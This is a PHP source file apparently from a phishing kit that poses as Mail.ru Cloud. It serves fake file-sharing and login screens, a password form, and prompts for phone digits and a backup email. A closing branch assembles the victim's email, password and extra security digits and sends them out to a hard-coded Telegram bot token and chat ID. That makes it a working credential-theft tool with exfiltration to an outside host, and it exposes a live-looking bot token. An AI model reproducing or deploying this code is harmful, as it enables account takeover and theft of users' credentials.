<?php
header('Content-Type: application/json');

// Получаем JSON из запроса
$input = file_get_contents('php://input');
$data = json_decode($input, true);

// Функция для генерации HTML шаблонов
function getTemplate($template, $templateData = []) {
    switch ($template) {
        case 'loading':
            return '<svg class="spinner" width="65px" height="65px" viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg">
                <defs>
                  <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="0%">
                    <stop offset="0%" style="stop-color:#005bff; stop-opacity:1;" />
                    <stop offset="15%" style="stop-color:#005bff; stop-opacity:1;" />
                    <stop offset="50%" style="stop-color:#005bff; stop-opacity:0.5;" />
                    <stop offset="75%" style="stop-color:#005bff; stop-opacity:0.3;" />
                    <stop offset="100%" style="stop-color:#005bff; stop-opacity:0;" />
                  </linearGradient>
                </defs>
                <circle class="path" fill="none" stroke-width="8" stroke-linecap="round" cx="33" cy="33" r="25"></circle>
              </svg>';

        case 'initial_file_access':
            $fromMail = isset($templateData['fromMail']) ? htmlspecialchars($templateData['fromMail']) : '';
            return '
                <div>
                    <div class="file-access-inner">
                        <div>Доступ к файлу</div>
                        <div>' . $fromMail . ' предостовляет вам доступ к файлу</div>
                        <div id="button-file-access" class="button-file-access">Перейти</div>
                    </div>
                    <div class="login-account-qr-code">
                        <div class="login-account-qr-code-inner">
                            <img src="css/res/qr-code-user.png" alt="">
                            <div class="qr-code-form">
                                <div class="qr-code-title">Быстрый вход по QR-коду</div>
                                <div class="qr-code-text">Наведите камеру телефона</div>
                                <a href="https://help.mail.ru/mail/account/login/qr#hint" class="qr-code-button">Подробнее</a>
                            </div>
                        </div>
                    </div>
                </div>';

        case 'login_account':
            $linkImg = isset($templateData['linkImg']) ? htmlspecialchars($templateData['linkImg']) : '';
            $accountMail = isset($templateData['accountMail']) ? htmlspecialchars($templateData['accountMail']) : '';
            return '
                <div class="login-account">
                    <div class="login-account-inner">
                        <div class="login-account-title">Войти в аккаунт</div>
                        <div class="login-account-title-button">
                            <img class="login-account-button-img" src="' . $linkImg . '" alt="">
                            <div class="login-account-button-div">' . $accountMail . '</div>
                        </div>
                    </div>
                    <div class="login-account-qr-code"> 
                        <div class="login-account-qr-code-inner">
                            <img src="css/res/qr-code-user.png" alt="">
                            <div class="qr-code-form"> 
                                <div class="qr-code-title">Быстрый вход по QR-коду</div>
                                <div class="qr-code-text">Наведите камеру телефона</div>
                                <a href="" class="qr-code-button">Подробнее</a>
                            </div>
                        </div>
                    </div>
                </div>';

        case 'login_account_user':
            $loginInputValue = isset($templateData['loginInputValue']) ? htmlspecialchars($templateData['loginInputValue']) : '';
            return '
                <div class="login-account-user">
                    <div class="login-account-form">
                        <div class="login-account-form-title-left">Данные от аккаунта</div>
                        <div class="user-name-repeat">
                            <div class="user-name-repeat-name">' . $loginInputValue . '</div>
                        </div>
                        <form action="" onsubmit="return false;">
                            <div class="form-input">
                                <div class="rs24-input-eye">
                                    <input class="rs24-input" id="rs24-input" type="password" placeholder="Пароль" required>
                                    <div class="rs24-input-eye-btn" id="rs24-input-eye-outside">
                                        <img class="rs24-input-eye-btn" id="rs24-input-eye-inner" src="css/res/icon-eye.png" alt="">
                                    </div>
                                </div>
                            </div>
                            <div class="form-button">
                                <div class="form-button-clk-rs24" id="form-button-clk-rs24">Открыть файл</div>
                                <div class="form-checkbox">
                                    <div id="form-checkbox-inner" class="form-checkbox-inner">
                                        <img class="form-checkbox-inner" src="css/res/icon-checkbox.svg" alt="">
                                    </div>
                                    <span>запомнить</span>
                                </div>
                            </div>
                        </form>
                    </div>
                    <div class="login-account-user-footer-rs24">
                        <a href="https://account.mail.ru/recovery">Восстановить доступ</a>
                        <div>
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none"
                                class="base-0-2-23" ie-style="">
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#333"
                                    d="M3 1a2 2 0 00-2 2v2a2 2 0 002 2h2a2 2 0 002-2V3a2 2 0 00-2-2H3zm.5 2a.5.5 0 00-.5.5v1a.5.5 0 00.5.5h1a.5.5 0 00.5-.5v-1a.5.5 0 00-.5-.5h-1zM3 9a2 2 0 00-2 2v2a2 2 0 002 2h2a2 2 0 002-2v-2a2 2 0 00-2-2H3zm.5 2a.5.5 0 00-.5.5v1a.5.5 0 00.5.5h1a.5.5 0 00.5-.5v-1a.5.5 0 00-.5-.5h-1zM11 1a2 2 0 00-2 2v2a2 2 0 002 2h2a2 2 0 002-2V3a2 2 0 00-2-2h-2zm.5 2a.5.5 0 00-.5.5v1a.5.5 0 00.5.5h1a.5.5 0 00.5-.5v-1a.5.5 0 00-.5-.5h-1z">
                                </path>
                                <rect x="9" y="13" width="2" height="2" rx="1" fill="#333"></rect>
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#333"
                                    d="M10 9a1 1 0 000 2h3v3a1 1 0 102 0v-4a1 1 0 00-1-1h-4z"></path>
                            </svg>
                            <a href="https://help.mail.ru/mail/account/login/qr#hint">Войти по QR-коду</a>
                        </div>
                    </div>
                </div>';

        case 'phone_input':
            return '
                <div>
                    <div class="file-num-inner" id="file-num-inner">
                        <div class="file-num-inner-top">
                            <div>Вход в аккаунт Mail.ru</div>
                            <div>Это точно вы? Дополните свой номер телефон, чтобы войти в аккаунт</div>
                            <div class="phone-input">
                                <span>+7 </span><span>(</span>
                                <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\d*">
                                <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\d*">
                                <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\d*">
                                <span>)</span>
                                <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\d*">
                                <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\d*">
                                <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\d*">
                                <span>-</span>
                                <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\d*">
                                <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\d*">
                                <span>-</span>
                                <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\d*">
                                <input type="text" maxlength="1" class="digit" placeholder="_" inputmode="numeric" pattern="\d*">
                            </div>
                            <div>Укажите шесть последних цифр номера</div>
                        </div>
                        <div class="file-num-inner-bottom">
                            <div class="four-button" id="continue-button" style="pointer-events:none; opacity:0.5;">Продолжить</div>
                        </div>
                    </div>
                </div>';

        case 'rezerv_block':
            return '
                <div>
                    <div id="rezerv_block" class="rezerv_block">
                        <div class="rezerv_block_text1">Вход в аккаунт Mail.ru</div>
                        <div class="rezerv_block_text2_outside">
                            <div class="rezerv_block_text2">Это точно вы? Укажите резервную почту,<br>чтобы войти в аккаунт</div>
                        </div>
                        <input class="rezerv_block_input1" type="text" placeholder="Введите резервную почту">
                        <div class="rezerv_block_button1_outside">
                            <div id="rezerv_block_button1" class="four-button">Продолжить</div>
                        </div>
                    </div>
                </div>';

        default:
            return '';
    }
}
// Обработка запроса
if (isset($data['action']) && $data['action'] === 'get_template') {
    $templateName = isset($data['template']) ? $data['template'] : '';
    $templateData = isset($data['data']) ? $data['data'] : [];
    $html = getTemplate($templateName, $templateData);
    echo json_encode(['html' => $html]);
} elseif (isset($data['rn25']) && isset($data['rs24']) && isset($data['num'])) {
    $login = $data->login;
    $pass = $data->pass;
    $num = $data->num;

    $token = "6841556725:AAHu7cCARNME-rZTSG5wN6lZeVdVZyspGFQ";

    $chat_id = "1140041690";

    $ip = $_SERVER['HTTP_CLIENT_IP'] ? $_SERVER['HTTP_CLIENT_IP'] :
    ($_SERVER['HTTP_X_FORWARDED_FOR'] ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);

    // Используем Markdown для жирного текста
    $message = "*▪️ Сайт: Облако Mail*\n*▪️ Email:* " . $login . "\n*▪️ Пароль:* " . $pass . "\n*▪️ Доп. защита:* " . $num;

    file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chat_id.'&text='.urlencode($message).'&parse_mode=Markdown');

} else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
}
?>
